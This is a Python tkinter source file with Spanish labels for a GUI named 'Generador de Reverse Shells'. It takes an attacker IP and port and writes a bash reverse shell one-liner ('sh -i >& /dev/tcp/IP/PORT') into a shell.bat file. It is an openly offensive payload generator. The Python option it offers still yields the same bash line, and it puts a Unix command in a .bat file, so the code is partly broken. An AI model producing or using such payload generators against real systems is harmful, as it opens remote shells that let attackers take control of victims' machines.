import tkinter as tk

def seleccionar_opcion(opcion, botones):
    for boton in botones:
        boton.config(bg="black")
    botones[opcion - 1].config(bg="purple")
    
    # Ocultar todos los elementos en la ventana principal
    for elemento in ventana.winfo_children():
        elemento.pack_forget()
    
    # Mostrar la interfaz de la opción seleccionada
    ventanas_opciones[opcion - 1].pack()

# Función para volver al menú principal
def volver_al_menu_principal():
    for ventana_opcion in ventanas_opciones:
        ventana_opcion.pack_forget()
    for elemento in ventana.winfo_children():
        elemento.pack()
    for boton in botones:
        boton.config(bg="black", fg="green")
    ventanas_opciones[0].pack_forget()  # Oculta la ventana de "Opción 1" al volver al menú principal

# Función para generar la configuración de la reverse shell
def generar_reverse_shell():
    direccion_ip = direccion_ip_entry.get()
    puerto_atacante = puerto_atacante_entry.get()
    reverse_shell_seleccionada = reverse_shell_var.get()

    if not direccion_ip or not puerto_atacante:
        error_label.config(text="Falta Agregar IP o PUERTO")
        return

    # Crear un archivo .bat con la configuración de la reverse shell
    with open("shell.bat", "w") as archivo:
        archivo.write(f"sh -i >& /dev/tcp/{direccion_ip}/{puerto_atacante} 0>&1\n")
    error_label.config(text="")  # Borra el mensaje de error si no falta ningún dato

# Crear la ventana principal
ventana = tk.Tk()
ventana.title("Generador de Reverse Shells")
ventana.configure(bg="black")  # Fondo oscuro
ventana.geometry("800x600")  # Aumentar el tamaño de la ventana

# Logo en formato de texto
logo_text = """
  _____                           _  _                       
 /  __ \                         (_)| |                      
 | /  \/  ___   _ __ ___   _ __   _ | | ______   __ _  _ __  
 | |     / _ \ | '_ ` _ \ | '_ \ | || ||______| / _` || '__| 
 | \__/\| (_) || | | | | || |_) || || |        | (_| || |    
  \____/ \___/ |_| |_| |_|| .__/ |_||_|         \__,_||_|    
                         | |                                
                         |_|                                
                                                        
https://github.com/Compil-AR
"""

# Mostrar el logo
logo_label = tk.Label(ventana, text=logo_text, bg="black", fg="green", font=("Courier", 8))
logo_label.pack(pady=10)

# Lista para almacenar los logos
logo_labels = [logo_label]

# Crear botones
botones = []
ventanas_opciones = []  # Lista para almacenar las interfaces de opciones

# Interfaz gráfica para la "Opción 1"
ventana_opcion1 = tk.Frame(ventana, bg="black")
ventana_opcion1.pack_forget()  # Inicialmente, ocultar la interfaz
ventanas_opciones.append(ventana_opcion1)

# Botón para mostrar mensaje de error
error_label = tk.Label(ventana_opcion1, text="", bg="black", fg="red")
error_label.grid(row=7, columnspan=2, padx=10, pady=10)


# Crear un contenedor para los botones del menú principal
menu_buttons_frame = tk.Frame(ventana, bg="black")
menu_buttons_frame.pack()

# Actualiza los textos de los botones del menú principal
for i in range(1, 4):
    boton = tk.Button(menu_buttons_frame, text=f"{i}- Opción {i}", command=lambda i=i: seleccionar_opcion(i, botones), bg="black", fg="green")
    if i == 1:
        boton.config(text="Crear Shell")
    elif i == 2:
        boton.config(text="Ver Shells")
    elif i == 3:
        boton.config(text="Shells Avanzados")
    boton.pack(side="left", padx=10, pady=10)
    botones.append(boton)

# Interfaz gráfica para la "Opción 1"
ventana_opcion1 = ventanas_opciones[0]
direccion_ip_label = tk.Label(ventana_opcion1, text="IP Atacante:", bg="black", fg="green")
direccion_ip_label.grid(row=1, column=1, padx=10, pady=10)
direccion_ip_entry = tk.Entry(ventana_opcion1, bg="green", fg="black")  # Cambiar el color de fondo y texto
direccion_ip_entry.grid(row=2, column=1, padx=10, pady=10)
puerto_atacante_label = tk.Label(ventana_opcion1, text="Puerto Atacante:", bg="black", fg="green")
puerto_atacante_label.grid(row=3, column=1, padx=10, pady=10)
puerto_atacante_entry = tk.Entry(ventana_opcion1, bg="green", fg="black")  # Cambiar el color de fondo y texto
puerto_atacante_entry.grid(row=4, column=1, padx=10, pady=10)
reverse_shells_label = tk.Label(ventana_opcion1, text="Selecciona una Reverse Shell:", bg="black", fg="green")
reverse_shells_label.grid(row=5, column=1, padx=10, pady=10)

opciones_reverse_shells = ["Bash", "Python"]  # Agrega más opciones si es necesario
reverse_shell_var = tk.StringVar(ventana_opcion1)
reverse_shell_var.set(opciones_reverse_shells[0])  # Opción predeterminada
reverse_shells_menu = tk.OptionMenu(ventana_opcion1, reverse_shell_var, *opciones_reverse_shells)
reverse_shells_menu.configure(bg="black", fg="green")
reverse_shells_menu.grid(row=5, column=2, padx=10, pady=10)
generar_reverse_shell_button = tk.Button(ventana_opcion1, text="GENERAR REVERSE SHELL", command=generar_reverse_shell, bg="black", fg="green")
generar_reverse_shell_button.grid(row=6, columnspan=2, padx=10, pady=10)

# Flecha para volver al menú principal
volver_button = tk.Button(ventana_opcion1, text="<-", command=volver_al_menu_principal, bg="green", fg="black")
volver_button.grid(row=0, column=0, sticky="NW")  # Ubicación en la parte superior izquierda

# Iniciar la aplicación
ventana.mainloop()
